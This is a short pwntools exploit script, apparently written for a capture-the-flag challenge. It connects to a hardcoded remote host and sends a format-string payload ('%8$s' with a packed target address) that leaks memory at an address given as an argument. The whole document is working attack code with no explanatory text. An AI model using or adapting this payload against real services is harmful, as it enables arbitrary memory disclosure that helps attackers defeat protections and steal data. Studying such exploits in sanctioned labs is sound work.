from pwn import *
import sys

off = 6
i = 0
MAX_DATA = 0x1000

r = remote('167.99.129.209',10003)

def pad(addr):
    return addr + '\x00'*(8-len(addr))

# Eg.: 0x602040
addr = int(sys.argv[1], 16)

r.recvuntil('>')
r.sendline('1')
r.recvuntil('**:')
r.sendline("A"*6 + "%8$s" + "B"*6 + p64(addr))
out = r.recvuntil('\n1.')
leak = (out.split('AAAAAA'))[1].split('BBBBBB')[0]
print(f'[+] Output: {hex(u64(pad(leak)))}')

#0x600e08
